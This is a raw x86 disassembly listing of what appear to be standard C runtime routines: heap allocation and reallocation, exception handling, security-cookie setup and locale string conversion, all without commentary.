  427163:	cmp    esi,0x20
  427166:	mov    BYTE PTR [esi+eax*1+0x4],cl
  42716a:	jge    0x42718f
  42716c:	cmp    BYTE PTR [ebp+0xb],0x0
  427170:	jne    0x42717d
  427172:	mov    edi,0x80000000
  427177:	mov    ecx,esi
  427179:	shr    edi,cl
  42717b:	or     DWORD PTR [ebx],edi
  42717d:	mov    ecx,esi
  42717f:	mov    edi,0x80000000
  427184:	shr    edi,cl
  427186:	mov    ecx,DWORD PTR [ebp-0x4]
  427189:	or     DWORD PTR [eax+ecx*4+0x44],edi
  42718d:	jmp    0x4271b8
  42718f:	cmp    BYTE PTR [ebp+0xb],0x0
  427193:	jne    0x4271a2
  427195:	lea    ecx,[esi-0x20]
  427198:	mov    edi,0x80000000
  42719d:	shr    edi,cl
  42719f:	or     DWORD PTR [ebx+0x4],edi
  4271a2:	mov    ecx,DWORD PTR [ebp-0x4]
  4271a5:	lea    edi,[eax+ecx*4+0xc4]
  4271ac:	lea    ecx,[esi-0x20]
  4271af:	mov    esi,0x80000000
  4271b4:	shr    esi,cl
  4271b6:	or     DWORD PTR [edi],esi
  4271b8:	mov    ecx,DWORD PTR [ebp-0x8]
  4271bb:	test   ecx,ecx
  4271bd:	je     0x4271ca
  4271bf:	mov    DWORD PTR [edx],ecx
  4271c1:	mov    DWORD PTR [ecx+edx*1-0x4],ecx
  4271c5:	jmp    0x4271ca
  4271c7:	mov    ecx,DWORD PTR [ebp-0x8]
  4271ca:	mov    esi,DWORD PTR [ebp-0x10]
  4271cd:	add    edx,ecx
  4271cf:	lea    ecx,[esi+0x1]
  4271d2:	mov    DWORD PTR [edx],ecx
  4271d4:	mov    DWORD PTR [edx+esi*1-0x4],ecx
  4271d8:	mov    esi,DWORD PTR [ebp-0xc]
  4271db:	mov    ecx,DWORD PTR [esi]
  4271dd:	test   ecx,ecx
  4271df:	lea    edi,[ecx+0x1]
  4271e2:	mov    DWORD PTR [esi],edi
  4271e4:	jne    0x427200
  4271e6:	cmp    ebx,DWORD PTR ds:0x45def8
  4271ec:	jne    0x427200
  4271ee:	mov    ecx,DWORD PTR [ebp-0x4]
  4271f1:	cmp    ecx,DWORD PTR ds:0x45df10
  4271f7:	jne    0x427200
  4271f9:	and    DWORD PTR ds:0x45def8,0x0
  427200:	mov    ecx,DWORD PTR [ebp-0x4]
  427203:	mov    DWORD PTR [eax],ecx
  427205:	lea    eax,[edx+0x4]
  427208:	pop    edi
  427209:	pop    esi
  42720a:	pop    ebx
  42720b:	leave  
  42720c:	ret    
  42720d:	int3   
  42720e:	int3   
  42720f:	int3   
  427210:	push   esi
  427211:	inc    ebx
  427212:	xor    dh,BYTE PTR [eax]
  427214:	pop    eax
  427215:	inc    ebx
  427216:	xor    BYTE PTR [eax],dh
  427218:	push   ebp
  427219:	mov    ebp,esp
  42721b:	sub    esp,0x8
  42721e:	push   ebx
  42721f:	push   esi
  427220:	push   edi
  427221:	push   ebp
  427222:	cld    
  427223:	mov    ebx,DWORD PTR [ebp+0xc]
  427226:	mov    eax,DWORD PTR [ebp+0x8]
  427229:	test   DWORD PTR [eax+0x4],0x6
  427230:	jne    0x4272b8
  427236:	mov    DWORD PTR [ebp-0x8],eax
  427239:	mov    eax,DWORD PTR [ebp+0x10]
  42723c:	mov    DWORD PTR [ebp-0x4],eax
  42723f:	lea    eax,[ebp-0x8]
  427242:	mov    DWORD PTR [ebx-0x4],eax
  427245:	mov    esi,DWORD PTR [ebx+0xc]
  427248:	mov    edi,DWORD PTR [ebx+0x8]
  42724b:	cmp    esi,0xffffffff
  42724e:	je     0x4272b1
  427250:	lea    ecx,[esi+esi*2]
  427253:	cmp    DWORD PTR [edi+ecx*4+0x4],0x0
  427258:	je     0x42729f
  42725a:	push   esi
  42725b:	push   ebp
  42725c:	lea    ebp,[ebx+0x10]
  42725f:	call   DWORD PTR [edi+ecx*4+0x4]
  427263:	pop    ebp
  427264:	pop    esi
  427265:	mov    ebx,DWORD PTR [ebp+0xc]
  427268:	or     eax,eax
  42726a:	je     0x42729f
  42726c:	js     0x4272aa
  42726e:	mov    edi,DWORD PTR [ebx+0x8]
  427271:	push   ebx
  427272:	call   0x4281a0
  427277:	add    esp,0x4
  42727a:	lea    ebp,[ebx+0x10]
  42727d:	push   esi
  42727e:	push   ebx
  42727f:	call   0x4281e2
  427284:	add    esp,0x8
  427287:	lea    ecx,[esi+esi*2]
  42728a:	push   0x1
  42728c:	mov    eax,DWORD PTR [edi+ecx*4+0x8]
  427290:	call   0x428276
  427295:	mov    eax,DWORD PTR [edi+ecx*4]
  427298:	mov    DWORD PTR [ebx+0xc],eax
  42729b:	call   DWORD PTR [edi+ecx*4+0x8]
  42729f:	mov    edi,DWORD PTR [ebx+0x8]
  4272a2:	lea    ecx,[esi+esi*2]
  4272a5:	mov    esi,DWORD PTR [edi+ecx*4]
  4272a8:	jmp    0x42724b
  4272aa:	mov    eax,0x0
  4272af:	jmp    0x4272cd
  4272b1:	mov    eax,0x1
  4272b6:	jmp    0x4272cd
  4272b8:	push   ebp
  4272b9:	lea    ebp,[ebx+0x10]
  4272bc:	push   0xffffffff
  4272be:	push   ebx
  4272bf:	call   0x4281e2
  4272c4:	add    esp,0x8
  4272c7:	pop    ebp
  4272c8:	mov    eax,0x1
  4272cd:	pop    ebp
  4272ce:	pop    edi
  4272cf:	pop    esi
  4272d0:	pop    ebx
  4272d1:	mov    esp,ebp
  4272d3:	pop    ebp
  4272d4:	ret    
  4272d5:	push   ebp
  4272d6:	mov    ecx,DWORD PTR [esp+0x8]
  4272da:	mov    ebp,DWORD PTR [ecx]
  4272dc:	mov    eax,DWORD PTR [ecx+0x1c]
  4272df:	push   eax
  4272e0:	mov    eax,DWORD PTR [ecx+0x18]
  4272e3:	push   eax
  4272e4:	call   0x4281e2
  4272e9:	add    esp,0x8
  4272ec:	pop    ebp
  4272ed:	ret    0x4
  4272f0:	call   0x425203
  4272f5:	add    eax,0x8
  4272f8:	ret    
  4272f9:	push   0x14
  4272fb:	push   0x429880
  427300:	call   0x425350
  427305:	mov    edi,DWORD PTR [ebp+0x8]
  427308:	xor    ebx,ebx
  42730a:	cmp    edi,ebx
  42730c:	jne    0x42731c
  42730e:	push   DWORD PTR [ebp+0xc]
  427311:	call   0x426072
  427316:	pop    ecx
  427317:	jmp    0x4274a0
  42731c:	mov    esi,DWORD PTR [ebp+0xc]
  42731f:	cmp    esi,ebx
  427321:	jne    0x42732f
  427323:	push   edi
  427324:	call   0x425f5a
  427329:	pop    ecx
  42732a:	jmp    0x42749e
  42732f:	cmp    DWORD PTR ds:0x45e144,0x3
  427336:	jne    0x42746a
  42733c:	mov    DWORD PTR [ebp-0x1c],ebx
  42733f:	cmp    esi,0xffffffe0
  427342:	ja     0x427439
  427348:	push   0x4
  42734a:	call   0x42550f
  42734f:	pop    ecx
  427350:	mov    DWORD PTR [ebp-0x4],ebx
  427353:	push   edi
  427354:	call   0x426732
  427359:	pop    ecx
  42735a:	mov    DWORD PTR [ebp-0x20],eax
  42735d:	cmp    eax,ebx
  42735f:	je     0x427409
  427365:	cmp    esi,DWORD PTR ds:0x45df04
  42736b:	ja     0x4273b9
  42736d:	push   esi
  42736e:	push   edi
  42736f:	push   eax
  427370:	call   0x426c32
  427375:	add    esp,0xc
  427378:	test   eax,eax
  42737a:	je     0x427381
  42737c:	mov    DWORD PTR [ebp-0x1c],edi
  42737f:	jmp    0x4273b9
  427381:	push   esi
  427382:	call   0x426f11
  427387:	pop    ecx
  427388:	mov    DWORD PTR [ebp-0x1c],eax
  42738b:	cmp    eax,ebx
  42738d:	je     0x4273b9
  42738f:	mov    eax,DWORD PTR [edi-0x4]
  427392:	dec    eax
  427393:	mov    DWORD PTR [ebp-0x24],eax
  427396:	cmp    eax,esi
  427398:	jb     0x42739c
  42739a:	mov    eax,esi
  42739c:	push   eax
  42739d:	push   edi
  42739e:	push   DWORD PTR [ebp-0x1c]
  4273a1:	call   0x426090
  4273a6:	push   edi
  4273a7:	call   0x426732
  4273ac:	mov    DWORD PTR [ebp-0x20],eax
  4273af:	push   edi
  4273b0:	push   eax
  4273b1:	call   0x42675d
  4273b6:	add    esp,0x18
  4273b9:	cmp    DWORD PTR [ebp-0x1c],ebx
  4273bc:	jne    0x427409
  4273be:	cmp    esi,ebx
  4273c0:	jne    0x4273c8
  4273c2:	xor    esi,esi
  4273c4:	inc    esi
  4273c5:	mov    DWORD PTR [ebp+0xc],esi
  4273c8:	add    esi,0xf
  4273cb:	and    esi,0xfffffff0
  4273ce:	mov    DWORD PTR [ebp+0xc],esi
  4273d1:	push   esi
  4273d2:	push   ebx
  4273d3:	push   DWORD PTR ds:0x45e140
  4273d9:	call   DWORD PTR ds:0x429030
  4273df:	mov    DWORD PTR [ebp-0x1c],eax
  4273e2:	cmp    eax,ebx
  4273e4:	je     0x427409
  4273e6:	mov    eax,DWORD PTR [edi-0x4]
  4273e9:	dec    eax
  4273ea:	mov    DWORD PTR [ebp-0x24],eax
  4273ed:	cmp    eax,esi
  4273ef:	jb     0x4273f3
  4273f1:	mov    eax,esi
  4273f3:	push   eax
  4273f4:	push   edi
  4273f5:	push   DWORD PTR [ebp-0x1c]
  4273f8:	call   0x426090
  4273fd:	push   edi
  4273fe:	push   DWORD PTR [ebp-0x20]
  427401:	call   0x42675d
  427406:	add    esp,0x14
  427409:	or     DWORD PTR [ebp-0x4],0xffffffff
  42740d:	call   0x427461
  427412:	cmp    DWORD PTR [ebp-0x20],ebx
  427415:	jne    0x427439
  427417:	cmp    esi,ebx
  427419:	jne    0x42741e
  42741b:	xor    esi,esi
  42741d:	inc    esi
  42741e:	add    esi,0xf
  427421:	and    esi,0xfffffff0
  427424:	mov    DWORD PTR [ebp+0xc],esi
  427427:	push   esi
  427428:	push   edi
  427429:	push   ebx
  42742a:	push   DWORD PTR ds:0x45e140
  427430:	call   DWORD PTR ds:0x4290d4
  427436:	mov    DWORD PTR [ebp-0x1c],eax
  427439:	mov    eax,DWORD PTR [ebp-0x1c]
  42743c:	cmp    eax,ebx
  42743e:	jne    0x4274a0
  427440:	cmp    DWORD PTR ds:0x45ddc8,ebx
  427446:	je     0x4274a0
  427448:	push   esi
  427449:	call   0x427c32
  42744e:	pop    ecx
  42744f:	test   eax,eax
  427451:	jne    0x42733c
  427457:	jmp    0x42749e
  427459:	xor    ebx,ebx
  42745b:	mov    esi,DWORD PTR [ebp+0xc]
  42745e:	mov    edi,DWORD PTR [ebp+0x8]
  427461:	push   0x4
  427463:	call   0x42547b
  427468:	pop    ecx
  427469:	ret    
  42746a:	xor    eax,eax
  42746c:	cmp    esi,0xffffffe0
  42746f:	ja     0x427487
  427471:	cmp    esi,ebx
  427473:	jne    0x427478
  427475:	xor    esi,esi
  427477:	inc    esi
  427478:	push   esi
  427479:	push   edi
  42747a:	push   ebx
  42747b:	push   DWORD PTR ds:0x45e140
  427481:	call   DWORD PTR ds:0x4290d4
  427487:	cmp    eax,ebx
  427489:	jne    0x4274a0
  42748b:	cmp    DWORD PTR ds:0x45ddc8,ebx
  427491:	je     0x4274a0
  427493:	push   esi
  427494:	call   0x427c32
  427499:	pop    ecx
  42749a:	test   eax,eax
  42749c:	jne    0x42746a
  42749e:	xor    eax,eax
  4274a0:	call   0x42538b
  4274a5:	ret    
  4274a6:	push   0x10
  4274a8:	push   0x429890
  4274ad:	call   0x425350
  4274b2:	cmp    DWORD PTR ds:0x45e144,0x3
  4274b9:	jne    0x4274f5
  4274bb:	push   0x4
  4274bd:	call   0x42550f
  4274c2:	pop    ecx
  4274c3:	and    DWORD PTR [ebp-0x4],0x0
  4274c7:	mov    esi,DWORD PTR [ebp+0x8]
  4274ca:	push   esi
  4274cb:	call   0x426732
  4274d0:	pop    ecx
  4274d1:	mov    DWORD PTR [ebp-0x1c],eax
  4274d4:	test   eax,eax
  4274d6:	je     0x4274e3
  4274d8:	mov    esi,DWORD PTR [esi-0x4]
  4274db:	sub    esi,0x9
  4274de:	mov    DWORD PTR [ebp-0x20],esi
  4274e1:	jmp    0x4274e6
  4274e3:	mov    esi,DWORD PTR [ebp-0x20]
  4274e6:	or     DWORD PTR [ebp-0x4],0xffffffff
  4274ea:	call   0x427513
  4274ef:	cmp    DWORD PTR [ebp-0x1c],0x0
  4274f3:	jne    0x427508
  4274f5:	push   DWORD PTR [ebp+0x8]
  4274f8:	push   0x0
  4274fa:	push   DWORD PTR ds:0x45e140
  427500:	call   DWORD PTR ds:0x4290d8
  427506:	mov    esi,eax
  427508:	mov    eax,esi
  42750a:	call   0x42538b
  42750f:	ret    
  427510:	mov    esi,DWORD PTR [ebp-0x20]
  427513:	push   0x4
  427515:	call   0x42547b
  42751a:	pop    ecx
  42751b:	ret    
  42751c:	push   ebp
  42751d:	mov    ebp,esp
  42751f:	sub    esp,0x10
  427522:	push   esi
  427523:	lea    eax,[ebp-0x8]
  427526:	push   eax
  427527:	call   DWORD PTR ds:0x4290e8
  42752d:	mov    esi,DWORD PTR [ebp-0x4]
  427530:	xor    esi,DWORD PTR [ebp-0x8]
  427533:	call   DWORD PTR ds:0x4290e4
  427539:	xor    esi,eax
  42753b:	call   DWORD PTR ds:0x42909c
  427541:	xor    esi,eax
  427543:	call   DWORD PTR ds:0x4290e0
  427549:	xor    esi,eax
  42754b:	lea    eax,[ebp-0x10]
  42754e:	push   eax
  42754f:	call   DWORD PTR ds:0x4290dc
  427555:	mov    eax,DWORD PTR [ebp-0xc]
  427558:	xor    eax,DWORD PTR [ebp-0x10]
  42755b:	xor    esi,eax
  42755d:	mov    DWORD PTR ds:0x45d430,esi
  427563:	jne    0x42756f
  427565:	mov    DWORD PTR ds:0x45d430,0xbb40e64e
  42756f:	pop    esi
  427570:	leave  
  427571:	ret    
  427572:	push   0x118
  427577:	push   0x429a40
  42757c:	call   0x425350
  427581:	mov    eax,ds:0x45d430
  427586:	xor    eax,DWORD PTR [ebp+0x4]
  427589:	mov    DWORD PTR [ebp-0x1c],eax
  42758c:	mov    eax,ds:0x45dd98
  427591:	xor    ecx,ecx
  427593:	cmp    eax,ecx
  427595:	je     0x4275b6
  427597:	mov    DWORD PTR [ebp-0x4],ecx
  42759a:	push   DWORD PTR [ebp+0xc]
  42759d:	push   DWORD PTR [ebp+0x8]
  4275a0:	call   eax
  4275a2:	pop    ecx
  4275a3:	pop    ecx
  4275a4:	or     DWORD PTR [ebp-0x4],0xffffffff
  4275a8:	jmp    0x4276b4
  4275ad:	xor    eax,eax
  4275af:	inc    eax
  4275b0:	ret    
  4275b1:	mov    esp,DWORD PTR [ebp-0x18]
  4275b4:	jmp    0x4275a4
  4275b6:	mov    eax,DWORD PTR [ebp+0x8]
  4275b9:	dec    eax
  4275ba:	je     0x4275cf
  4275bc:	mov    edi,0x429a1c
  4275c1:	mov    DWORD PTR [ebp-0x20],0x429968
  4275c8:	mov    esi,0xd4
  4275cd:	jmp    0x4275e0
  4275cf:	mov    edi,0x429948
  4275d4:	mov    DWORD PTR [ebp-0x20],0x4298a8
  4275db:	mov    esi,0xb9
  4275e0:	mov    BYTE PTR [ebp-0x24],cl
  4275e3:	push   0x104
  4275e8:	lea    eax,[ebp-0x128]
  4275ee:	push   eax
  4275ef:	push   ecx
  4275f0:	call   DWORD PTR ds:0x42906c
  4275f6:	test   eax,eax
  4275f8:	jne    0x42760d
  4275fa:	push   0x42959c
  4275ff:	lea    eax,[ebp-0x128]
  427605:	push   eax
  427606:	call   0x425730
  42760b:	pop    ecx
  42760c:	pop    ecx
  42760d:	lea    ebx,[ebp-0x128]
  427613:	lea    eax,[ebp-0x128]
  427619:	push   eax
  42761a:	call   0x425960
  42761f:	pop    ecx
  427620:	add    eax,0xb
  427623:	cmp    eax,0x3c
  427626:	jbe    0x427651
  427628:	lea    eax,[ebp-0x128]
  42762e:	push   eax
  42762f:	call   0x425960
  427634:	mov    ebx,eax
  427636:	lea    eax,[ebp-0x128]
  42763c:	sub    eax,0x31
  42763f:	add    ebx,eax
  427641:	push   0x3
  427643:	push   0x429598
  427648:	push   ebx
  427649:	call   0x425830
  42764e:	add    esp,0x10
  427651:	push   ebx
  427652:	call   0x425960
  427657:	pop    ecx
  427658:	lea    eax,[eax+esi*1+0xc]
  42765c:	add    eax,0x3
  42765f:	and    eax,0xfffffffc
  427662:	call   0x4253a0
  427667:	mov    DWORD PTR [ebp-0x18],esp
  42766a:	mov    esi,esp
  42766c:	push   edi
  42766d:	push   esi
  42766e:	call   0x425730
  427673:	mov    edi,0x429578
  427678:	push   edi
  427679:	push   esi
  42767a:	call   0x425740
  42767f:	push   0x42989c
  427684:	push   esi
  427685:	call   0x425740
  42768a:	push   ebx
  42768b:	push   esi
  42768c:	call   0x425740
  427691:	push   edi
  427692:	push   esi
  427693:	call   0x425740
  427698:	push   DWORD PTR [ebp-0x20]
  42769b:	push   esi
  42769c:	call   0x425740
  4276a1:	push   0x12010
  4276a6:	push   0x429550
  4276ab:	push   esi
  4276ac:	call   0x425632
  4276b1:	add    esp,0x3c
  4276b4:	push   0x3
  4276b6:	call   0x4247bc
  4276bb:	int3   
  4276bc:	push   0x38
  4276be:	push   0x429e60
  4276c3:	call   0x425350
  4276c8:	xor    ebx,ebx
  4276ca:	cmp    DWORD PTR ds:0x45ddbc,ebx
  4276d0:	jne    0x42770a
  4276d2:	push   ebx
  4276d3:	push   ebx
  4276d4:	xor    esi,esi
  4276d6:	inc    esi
  4276d7:	push   esi
  4276d8:	push   0x429e5c
  4276dd:	push   0x100
  4276e2:	push   ebx
  4276e3:	call   DWORD PTR ds:0x4290f4
  4276e9:	test   eax,eax
  4276eb:	je     0x4276f5
  4276ed:	mov    DWORD PTR ds:0x45ddbc,esi
  4276f3:	jmp    0x42770a
  4276f5:	call   DWORD PTR ds:0x429028
  4276fb:	cmp    eax,0x78
  4276fe:	jne    0x42770a
  427700:	mov    DWORD PTR ds:0x45ddbc,0x2
  42770a:	cmp    DWORD PTR [ebp+0x14],ebx
  42770d:	jle    0x42772a
  42770f:	mov    ecx,DWORD PTR [ebp+0x14]
  427712:	mov    eax,DWORD PTR [ebp+0x10]
  427715:	dec    ecx
  427716:	cmp    BYTE PTR [eax],bl
  427718:	je     0x427722
  42771a:	inc    eax
  42771b:	cmp    ecx,ebx
  42771d:	jne    0x427715
  42771f:	or     ecx,0xffffffff
  427722:	or     eax,0xffffffff
  427725:	sub    eax,ecx
  427727:	add    DWORD PTR [ebp+0x14],eax
  42772a:	mov    eax,ds:0x45ddbc
  42772f:	cmp    eax,0x2
  427732:	je     0x427914
  427738:	cmp    eax,ebx
  42773a:	je     0x427914
  427740:	cmp    eax,0x1
  427743:	jne    0x427947
  427749:	xor    edi,edi
  42774b:	mov    DWORD PTR [ebp-0x1c],edi
  42774e:	mov    DWORD PTR [ebp-0x20],ebx
  427751:	mov    DWORD PTR [ebp-0x24],ebx
  427754:	cmp    DWORD PTR [ebp+0x20],ebx
  427757:	jne    0x427761
  427759:	mov    eax,ds:0x45ddb4
  42775e:	mov    DWORD PTR [ebp+0x20],eax
  427761:	push   ebx
  427762:	push   ebx
  427763:	push   DWORD PTR [ebp+0x14]
  427766:	push   DWORD PTR [ebp+0x10]
  427769:	xor    eax,eax
  42776b:	cmp    DWORD PTR [ebp+0x24],ebx
  42776e:	setne  al
  427771:	lea    eax,[eax*8+0x1]
  427778:	push   eax
  427779:	push   DWORD PTR [ebp+0x20]
  42777c:	call   DWORD PTR ds:0x4290f0
  427782:	mov    esi,eax
  427784:	mov    DWORD PTR [ebp-0x28],esi
  427787:	cmp    esi,ebx
  427789:	je     0x427947
  42778f:	mov    DWORD PTR [ebp-0x4],0x1
  427796:	lea    eax,[esi+esi*1]
  427799:	add    eax,0x3
  42779c:	and    eax,0xfffffffc
  42779f:	call   0x4253a0
  4277a4:	mov    DWORD PTR [ebp-0x18],esp
  4277a7:	mov    eax,esp
  4277a9:	mov    DWORD PTR [ebp-0x2c],eax
  4277ac:	or     DWORD PTR [ebp-0x4],0xffffffff
  4277b0:	jmp    0x4277cd
  4277b2:	xor    eax,eax
  4277b4:	inc    eax
  4277b5:	ret    
  4277b6:	mov    esp,DWORD PTR [ebp-0x18]
  4277b9:	call   0x4287e5
  4277be:	xor    ebx,ebx
  4277c0:	mov    DWORD PTR [ebp-0x2c],ebx
  4277c3:	or     DWORD PTR [ebp-0x4],0xffffffff
  4277c7:	mov    edi,DWORD PTR [ebp-0x1c]
  4277ca:	mov    esi,DWORD PTR [ebp-0x28]
  4277cd:	cmp    DWORD PTR [ebp-0x2c],ebx
  4277d0:	jne    0x4277ee
  4277d2:	lea    eax,[esi+esi*1]
  4277d5:	push   eax
  4277d6:	call   0x426072
  4277db:	pop    ecx
  4277dc:	mov    DWORD PTR [ebp-0x2c],eax
  4277df:	cmp    eax,ebx
  4277e1:	je     0x427947
  4277e7:	mov    DWORD PTR [ebp-0x20],0x1
  4277ee:	push   esi
  4277ef:	push   DWORD PTR [ebp-0x2c]
  4277f2:	push   DWORD PTR [ebp+0x14]
  4277f5:	push   DWORD PTR [ebp+0x10]
  4277f8:	push   0x1
  4277fa:	push   DWORD PTR [ebp+0x20]
  4277fd:	call   DWORD PTR ds:0x4290f0
  427803:	test   eax,eax
  427805:	je     0x4278f1
  42780b:	push   ebx
  42780c:	push   ebx
  42780d:	push   esi
  42780e:	push   DWORD PTR [ebp-0x2c]
  427811:	push   DWORD PTR [ebp+0xc]
  427814:	push   DWORD PTR [ebp+0x8]
  427817:	call   DWORD PTR ds:0x4290f4
  42781d:	mov    edi,eax
  42781f:	mov    DWORD PTR [ebp-0x1c],edi
  427822:	cmp    edi,ebx
  427824:	je     0x4278f1
  42782a:	test   BYTE PTR [ebp+0xd],0x4
  42782e:	je     0x42785d
  427830:	cmp    DWORD PTR [ebp+0x1c],ebx
  427833:	je     0x4278f1
  427839:	cmp    edi,DWORD PTR [ebp+0x1c]
  42783c:	jg     0x4278f1
  427842:	push   DWORD PTR [ebp+0x1c]
  427845:	push   DWORD PTR [ebp+0x18]
  427848:	push   esi
  427849:	push   DWORD PTR [ebp-0x2c]
  42784c:	push   DWORD PTR [ebp+0xc]
  42784f:	push   DWORD PTR [ebp+0x8]
  427852:	call   DWORD PTR ds:0x4290f4
  427858:	jmp    0x4278f1
  42785d:	mov    DWORD PTR [ebp-0x4],0x2
  427864:	lea    eax,[edi+edi*1]
  427867:	add    eax,0x3
  42786a:	and    eax,0xfffffffc
  42786d:	call   0x4253a0
  427872:	mov    DWORD PTR [ebp-0x18],esp
  427875:	mov    eax,esp
  427877:	mov    DWORD PTR [ebp-0x30],eax
  42787a:	or     DWORD PTR [ebp-0x4],0xffffffff
  42787e:	jmp    0x42789b
  427880:	xor    eax,eax
  427882:	inc    eax
  427883:	ret    
  427884:	mov    esp,DWORD PTR [ebp-0x18]
  427887:	call   0x4287e5
  42788c:	xor    ebx,ebx
  42788e:	mov    DWORD PTR [ebp-0x30],ebx
  427891:	or     DWORD PTR [ebp-0x4],0xffffffff
  427895:	mov    edi,DWORD PTR [ebp-0x1c]
  427898:	mov    esi,DWORD PTR [ebp-0x28]
  42789b:	cmp    DWORD PTR [ebp-0x30],ebx
  42789e:	jne    0x4278b8
  4278a0:	lea    eax,[edi+edi*1]
  4278a3:	push   eax
  4278a4:	call   0x426072
  4278a9:	pop    ecx
  4278aa:	mov    DWORD PTR [ebp-0x30],eax
  4278ad:	cmp    eax,ebx
  4278af:	je     0x4278f1
  4278b1:	mov    DWORD PTR [ebp-0x24],0x1
  4278b8:	push   edi
  4278b9:	push   DWORD PTR [ebp-0x30]
  4278bc:	push   esi
  4278bd:	push   DWORD PTR [ebp-0x2c]
  4278c0:	push   DWORD PTR [ebp+0xc]
  4278c3:	push   DWORD PTR [ebp+0x8]
  4278c6:	call   DWORD PTR ds:0x4290f4
  4278cc:	test   eax,eax
  4278ce:	je     0x4278f1
  4278d0:	push   ebx
  4278d1:	push   ebx
  4278d2:	cmp    DWORD PTR [ebp+0x1c],ebx
  4278d5:	jne    0x4278db
  4278d7:	push   ebx
  4278d8:	push   ebx
  4278d9:	jmp    0x4278e1
  4278db:	push   DWORD PTR [ebp+0x1c]
  4278de:	push   DWORD PTR [ebp+0x18]
  4278e1:	push   edi
  4278e2:	push   DWORD PTR [ebp-0x30]
  4278e5:	push   ebx
  4278e6:	push   DWORD PTR [ebp+0x20]
  4278e9:	call   DWORD PTR ds:0x429080
  4278ef:	mov    edi,eax
  4278f1:	cmp    DWORD PTR [ebp-0x24],ebx
  4278f4:	je     0x4278ff
  4278f6:	push   DWORD PTR [ebp-0x30]
  4278f9:	call   0x425f5a
  4278fe:	pop    ecx
  4278ff:	cmp    DWORD PTR [ebp-0x20],ebx
  427902:	je     0x42790d
  427904:	push   DWORD PTR [ebp-0x2c]
  427907:	call   0x425f5a
  42790c:	pop    ecx
  42790d:	mov    eax,edi
  42790f:	jmp    0x427a6f
  427914:	mov    DWORD PTR [ebp-0x34],ebx
  427917:	xor    edi,edi
  427919:	mov    DWORD PTR [ebp-0x38],ebx
  42791c:	cmp    DWORD PTR [ebp+0x8],ebx
  42791f:	jne    0x427929
  427921:	mov    eax,ds:0x45dda4
  427926:	mov    DWORD PTR [ebp+0x8],eax
  427929:	cmp    DWORD PTR [ebp+0x20],ebx
  42792c:	jne    0x427936
  42792e:	mov    eax,ds:0x45ddb4
  427933:	mov    DWORD PTR [ebp+0x20],eax
  427936:	push   DWORD PTR [ebp+0x8]
  427939:	call   0x4285cd
  42793e:	pop    ecx
  42793f:	mov    DWORD PTR [ebp-0x3c],eax
  427942:	cmp    eax,0xffffffff
  427945:	jne    0x42794e
  427947:	xor    eax,eax
  427949:	jmp    0x427a6f
  42794e:	cmp    eax,DWORD PTR [ebp+0x20]
  427951:	je     0x427a45
  427957:	push   ebx
  427958:	push   ebx
  427959:	lea    ecx,[ebp+0x14]
  42795c:	push   ecx
  42795d:	push   DWORD PTR [ebp+0x10]
  427960:	push   eax
  427961:	push   DWORD PTR [ebp+0x20]
  427964:	call   0x428616
  427969:	add    esp,0x18
  42796c:	mov    DWORD PTR [ebp-0x34],eax
  42796f:	cmp    eax,ebx
  427971:	je     0x427947
  427973:	push   ebx
  427974:	push   ebx
  427975:	push   DWORD PTR [ebp+0x14]
  427978:	push   eax
  427979:	push   DWORD PTR [ebp+0xc]
  42797c:	push   DWORD PTR [ebp+0x8]
  42797f:	call   DWORD PTR ds:0x4290ec
  427985:	mov    esi,eax
  427987:	mov    DWORD PTR [ebp-0x40],esi
  42798a:	cmp    esi,ebx
  42798c:	je     0x427a34
  427992:	mov    DWORD PTR [ebp-0x4],ebx
  427995:	add    eax,0x3
  427998:	and    eax,0xfffffffc
  42799b:	call   0x4253a0
  4279a0:	mov    DWORD PTR [ebp-0x18],esp
  4279a3:	mov    edi,esp
  4279a5:	mov    DWORD PTR [ebp-0x44],edi
  4279a8:	push   esi
  4279a9:	push   ebx
  4279aa:	push   edi
  4279ab:	call   0x427c50
  4279b0:	add    esp,0xc
  4279b3:	jmp    0x4279c5
  4279b5:	xor    eax,eax
  4279b7:	inc    eax
  4279b8:	ret    
  4279b9:	mov    esp,DWORD PTR [ebp-0x18]
  4279bc:	call   0x4287e5
  4279c1:	xor    ebx,ebx
  4279c3:	xor    edi,edi
  4279c5:	or     DWORD PTR [ebp-0x4],0xffffffff
  4279c9:	cmp    edi,ebx
  4279cb:	jne    0x4279f0
  4279cd:	push   DWORD PTR [ebp-0x40]
  4279d0:	call   0x426072
  4279d5:	pop    ecx
  4279d6:	mov    edi,eax
  4279d8:	cmp    edi,ebx
  4279da:	je     0x427a0d
  4279dc:	push   DWORD PTR [ebp-0x40]
  4279df:	push   ebx
  4279e0:	push   edi
  4279e1:	call   0x427c50
  4279e6:	add    esp,0xc
  4279e9:	mov    DWORD PTR [ebp-0x38],0x1
  4279f0:	push   DWORD PTR [ebp-0x40]
  4279f3:	push   edi
  4279f4:	push   DWORD PTR [ebp+0x14]
  4279f7:	push   DWORD PTR [ebp-0x34]
  4279fa:	push   DWORD PTR [ebp+0xc]
  4279fd:	push   DWORD PTR [ebp+0x8]
  427a00:	call   DWORD PTR ds:0x4290ec
  427a06:	mov    DWORD PTR [ebp-0x40],eax
  427a09:	cmp    eax,ebx
  427a0b:	jne    0x427a11
  427a0d:	xor    esi,esi
  427a0f:	jmp    0x427a37
  427a11:	push   DWORD PTR [ebp+0x1c]
  427a14:	push   DWORD PTR [ebp+0x18]
  427a17:	lea    eax,[ebp-0x40]
  427a1a:	push   eax
  427a1b:	push   edi
  427a1c:	push   DWORD PTR [ebp+0x20]
  427a1f:	push   DWORD PTR [ebp-0x3c]
  427a22:	call   0x428616
  427a27:	add    esp,0x18
  427a2a:	mov    esi,eax
  427a2c:	neg    esi
  427a2e:	sbb    esi,esi
  427a30:	neg    esi
  427a32:	jmp    0x427a37
  427a34:	mov    esi,DWORD PTR [ebp-0x48]
  427a37:	cmp    DWORD PTR [ebp-0x38],ebx
  427a3a:	je     0x427a5f
  427a3c:	push   edi
  427a3d:	call   0x425f5a
  427a42:	pop    ecx
  427a43:	jmp    0x427a5f
  427a45:	push   DWORD PTR [ebp+0x1c]
  427a48:	push   DWORD PTR [ebp+0x18]
  427a4b:	push   DWORD PTR [ebp+0x14]
  427a4e:	push   DWORD PTR [ebp+0x10]
  427a51:	push   DWORD PTR [ebp+0xc]
  427a54:	push   DWORD PTR [ebp+0x8]
  427a57:	call   DWORD PTR ds:0x4290ec
  427a5d:	mov    esi,eax
  427a5f:	cmp    DWORD PTR [ebp-0x34],ebx
  427a62:	je     0x427a6d
  427a64:	push   DWORD PTR [ebp-0x34]
  427a67:	call   0x425f5a
  427a6c:	pop    ecx
  427a6d:	mov    eax,esi
  427a6f:	lea    esp,[ebp-0x54]
